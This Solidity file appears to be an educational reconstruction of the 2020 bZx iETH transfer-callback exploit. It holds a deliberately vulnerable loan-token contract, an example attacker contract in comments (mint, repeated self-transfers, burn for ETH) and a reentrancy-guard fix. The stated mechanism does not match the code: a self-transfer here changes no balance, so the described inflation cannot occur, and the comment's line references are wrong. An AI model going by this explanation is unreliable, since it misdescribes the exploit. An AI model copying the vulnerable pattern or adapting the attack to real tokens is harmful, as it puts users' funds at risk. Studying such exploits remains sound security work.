/*LN-1*/ // SPDX-License-Identifier: MIT
/*LN-2*/ pragma solidity ^0.8.0;
/*LN-3*/ 
/*LN-4*/ /**
/*LN-5*/  * @title bZx Protocol - Transfer Callback Manipulation
/*LN-6*/  * @notice This contract demonstrates the vulnerability in bZx's loan token
/*LN-7*/  * @dev September 2020 - Flash loan + transfer callback exploit
/*LN-8*/  *
/*LN-9*/  * VULNERABILITY: Transfer callback that modifies state during balance queries
/*LN-10*/  *
/*LN-11*/  * ROOT CAUSE:
/*LN-12*/  * The mintWithEther() function calculates how many tokens to mint based on
/*LN-13*/  * totalSupply and total assets. When transfer() is called on the loan token,
/*LN-14*/  * it triggers a callback to the recipient. An attacker can use this callback
/*LN-15*/  * to call transfer() again, which recalculates shares using the modified
/*LN-16*/  * but not yet finalized state, leading to inflated token minting.
/*LN-17*/  *
/*LN-18*/  * ATTACK VECTOR:
/*LN-19*/  * 1. Call mintWithEther() with ETH
/*LN-20*/  * 2. Receive loan tokens
/*LN-21*/  * 3. Call transfer() to self repeatedly in a loop
/*LN-22*/  * 4. Each transfer() triggers recipient callback
/*LN-23*/  * 5. During callback, balance hasn't been updated yet
/*LN-24*/  * 6. Internal calculations use stale state
/*LN-25*/  * 7. After 4-5 transfers to self, token balance inflates
/*LN-26*/  * 8. Burn inflated tokens back to ETH for profit
/*LN-27*/  *
/*LN-28*/  * This exploits the state inconsistency during token transfer callbacks.
/*LN-29*/  */
/*LN-30*/ 
/*LN-31*/ interface IERC20 {
/*LN-32*/     function transfer(address to, uint256 amount) external returns (bool);
/*LN-33*/ 
/*LN-34*/     function balanceOf(address account) external view returns (uint256);
/*LN-35*/ }
/*LN-36*/ 
/*LN-37*/ contract VulnerableBZXLoanToken {
/*LN-38*/     string public name = "iETH";
/*LN-39*/     string public symbol = "iETH";
/*LN-40*/ 
/*LN-41*/     mapping(address => uint256) public balances;
/*LN-42*/     uint256 public totalSupply;
/*LN-43*/     uint256 public totalAssetBorrow;
/*LN-44*/     uint256 public totalAssetSupply;
/*LN-45*/ 
/*LN-46*/     /**
/*LN-47*/      * @notice Mint loan tokens by depositing ETH
/*LN-48*/      */
/*LN-49*/     function mintWithEther(
/*LN-50*/         address receiver
/*LN-51*/     ) external payable returns (uint256 mintAmount) {
/*LN-52*/         uint256 currentPrice = _tokenPrice();
/*LN-53*/         mintAmount = (msg.value * 1e18) / currentPrice;
/*LN-54*/ 
/*LN-55*/         balances[receiver] += mintAmount;
/*LN-56*/         totalSupply += mintAmount;
/*LN-57*/         totalAssetSupply += msg.value;
/*LN-58*/ 
/*LN-59*/         return mintAmount;
/*LN-60*/     }
/*LN-61*/ 
/*LN-62*/     /**
/*LN-63*/      * @notice Transfer tokens to another address
/*LN-64*/      * @param to Recipient address
/*LN-65*/      * @param amount Amount to transfer
/*LN-66*/      *
/*LN-67*/      * VULNERABILITY IS HERE:
/*LN-68*/      * The function updates balances and then calls _notifyTransfer which
/*LN-69*/      * can trigger callbacks to the recipient. During this callback, the
/*LN-70*/      * contract's state is in an inconsistent state - balances are updated
/*LN-71*/      * but totalSupply hasn't been recalculated if needed.
/*LN-72*/      *
/*LN-73*/      * Vulnerable sequence:
/*LN-74*/      * 1. Update sender balance (line 82)
/*LN-75*/      * 2. Update receiver balance (line 83)
/*LN-76*/      * 3. Call _notifyTransfer (line 85) <- CALLBACK
/*LN-77*/      * 4. During callback, recipient can call transfer() again
/*LN-78*/      * 5. New transfer() sees inconsistent state
/*LN-79*/      * 6. Calculations based on this state are wrong
/*LN-80*/      * 7. After 4-5 iterations, balances inflate
/*LN-81*/      */
/*LN-82*/     function transfer(address to, uint256 amount) external returns (bool) {
/*LN-83*/         require(balances[msg.sender] >= amount, "Insufficient balance");
/*LN-84*/ 
/*LN-85*/         balances[msg.sender] -= amount;
/*LN-86*/         balances[to] += amount;
/*LN-87*/ 
/*LN-88*/         _notifyTransfer(msg.sender, to, amount);
/*LN-89*/ 
/*LN-90*/         return true;
/*LN-91*/     }
/*LN-92*/ 
/*LN-93*/     /**
/*LN-94*/      * @notice Internal function that triggers callback
/*LN-95*/      * @dev This is where the reentrancy/callback happens
/*LN-96*/      */
/*LN-97*/     function _notifyTransfer(
/*LN-98*/         address from,
/*LN-99*/         address to,
/*LN-100*/         uint256 amount
/*LN-101*/     ) internal {
/*LN-102*/         // If 'to' is a contract, it might have a callback
/*LN-103*/         // During this callback, contract state is inconsistent
/*LN-104*/ 
/*LN-105*/         // Simulate callback by calling a function on recipient if it's a contract
/*LN-106*/         if (_isContract(to)) {
/*LN-107*/             // This would trigger fallback/receive on recipient
/*LN-108*/             // During that callback, recipient can call transfer() again
/*LN-109*/             (bool success, ) = to.call("");
/*LN-110*/             success; // Suppress warning
/*LN-111*/         }
/*LN-112*/     }
/*LN-113*/ 
/*LN-114*/     /**
/*LN-115*/      * @notice Burn tokens back to ETH
/*LN-116*/      */
/*LN-117*/     function burnToEther(
/*LN-118*/         address receiver,
/*LN-119*/         uint256 amount
/*LN-120*/     ) external returns (uint256 ethAmount) {
/*LN-121*/         require(balances[msg.sender] >= amount, "Insufficient balance");
/*LN-122*/ 
/*LN-123*/         uint256 currentPrice = _tokenPrice();
/*LN-124*/         ethAmount = (amount * currentPrice) / 1e18;
/*LN-125*/ 
/*LN-126*/         balances[msg.sender] -= amount;
/*LN-127*/         totalSupply -= amount;
/*LN-128*/         totalAssetSupply -= ethAmount;
/*LN-129*/ 
/*LN-130*/         payable(receiver).transfer(ethAmount);
/*LN-131*/ 
/*LN-132*/         return ethAmount;
/*LN-133*/     }
/*LN-134*/ 
/*LN-135*/     /**
/*LN-136*/      * @notice Calculate current token price
/*LN-137*/      * @dev Price is based on total supply and total assets
/*LN-138*/      */
/*LN-139*/     function _tokenPrice() internal view returns (uint256) {
/*LN-140*/         if (totalSupply == 0) {
/*LN-141*/             return 1e18; // Initial price 1:1
/*LN-142*/         }
/*LN-143*/         return (totalAssetSupply * 1e18) / totalSupply;
/*LN-144*/     }
/*LN-145*/ 
/*LN-146*/     /**
/*LN-147*/      * @notice Check if address is a contract
/*LN-148*/      */
/*LN-149*/     function _isContract(address account) internal view returns (bool) {
/*LN-150*/         uint256 size;
/*LN-151*/         assembly {
/*LN-152*/             size := extcodesize(account)
/*LN-153*/         }
/*LN-154*/         return size > 0;
/*LN-155*/     }
/*LN-156*/ 
/*LN-157*/     function balanceOf(address account) external view returns (uint256) {
/*LN-158*/         return balances[account];
/*LN-159*/     }
/*LN-160*/ 
/*LN-161*/     receive() external payable {}
/*LN-162*/ }
/*LN-163*/ 
/*LN-164*/ /**
/*LN-165*/  * Example attack contract:
/*LN-166*/  *
/*LN-167*/  * contract BZXAttacker {
/*LN-168*/  *     VulnerableBZXLoanToken public loanToken;
/*LN-169*/  *     uint256 public transferCount;
/*LN-170*/  *
/*LN-171*/  *     constructor(address _loanToken) {
/*LN-172*/  *         loanToken = VulnerableBZXLoanToken(_loanToken);
/*LN-173*/  *     }
/*LN-174*/  *
/*LN-175*/  *     function attack() external payable {
/*LN-176*/  *         // Step 1: Mint loan tokens with ETH
/*LN-177*/  *         loanToken.mintWithEther{value: msg.value}(address(this));
/*LN-178*/  *
/*LN-179*/  *         // Step 2: Transfer to self repeatedly
/*LN-180*/  *         // Each transfer triggers fallback, creating state inconsistency
/*LN-181*/  *         for (uint i = 0; i < 4; i++) {
/*LN-182*/  *             uint256 balance = loanToken.balanceOf(address(this));
/*LN-183*/  *             loanToken.transfer(address(this), balance);
/*LN-184*/  *         }
/*LN-185*/  *
/*LN-186*/  *         // Step 3: Burn inflated tokens back to ETH
/*LN-187*/  *         uint256 finalBalance = loanToken.balanceOf(address(this));
/*LN-188*/  *         loanToken.burnToEther(address(this), finalBalance);
/*LN-189*/  *     }
/*LN-190*/  *
/*LN-191*/  *     // Fallback is triggered during transfer
/*LN-192*/  *     fallback() external payable {
/*LN-193*/  *         // State is inconsistent here
/*LN-194*/  *         // Could perform additional transfers if needed
/*LN-195*/  *     }
/*LN-196*/  * }
/*LN-197*/  *
/*LN-198*/  * REAL-WORLD IMPACT:
/*LN-199*/  * - Multiple exploits on bZx in 2020
/*LN-200*/  * - This specific vulnerability in September 2020
/*LN-201*/  * - Demonstrated callback/reentrancy in token transfers
/*LN-202*/  * - Led to improved transfer patterns in DeFi
/*LN-203*/  *
/*LN-204*/  * FIX:
/*LN-205*/  * Use reentrancy guards on transfer:
/*LN-206*/  *
/*LN-207*/  * bool private locked;
/*LN-208*/  *
/*LN-209*/  * modifier nonReentrant() {
/*LN-210*/  *     require(!locked, "No reentrancy");
/*LN-211*/  *     locked = true;
/*LN-212*/  *     _;
/*LN-213*/  *     locked = false;
/*LN-214*/  * }
/*LN-215*/  *
/*LN-216*/  * function transfer(address to, uint256 amount) external nonReentrant returns (bool) {
/*LN-217*/  *     require(balances[msg.sender] >= amount, "Insufficient balance");
/*LN-218*/  *     balances[msg.sender] -= amount;
/*LN-219*/  *     balances[to] += amount;
/*LN-220*/  *     _notifyTransfer(msg.sender, to, amount);
/*LN-221*/  *     return true;
/*LN-222*/  * }
/*LN-223*/  *
/*LN-224*/  * Or avoid callbacks during transfers entirely:
/*LN-225*/  *
/*LN-226*/  * function transfer(address to, uint256 amount) external returns (bool) {
/*LN-227*/  *     require(balances[msg.sender] >= amount, "Insufficient balance");
/*LN-228*/  *     balances[msg.sender] -= amount;
/*LN-229*/  *     balances[to] += amount;
/*LN-230*/  *     emit Transfer(msg.sender, to, amount);  // Just emit, no callbacks
/*LN-231*/  *     return true;
/*LN-232*/  * }
/*LN-233*/  *
/*LN-234*/  *
/*LN-235*/  * KEY LESSON:
/*LN-236*/  * Avoid callbacks during critical state changes like token transfers.
/*LN-237*/  * If callbacks are necessary, use reentrancy guards.
/*LN-238*/  * Token transfer functions should be simple and not trigger external calls.
/*LN-239*/  * State consistency is crucial - don't allow callbacks during state updates.
/*LN-240*/  */
/*LN-241*/ 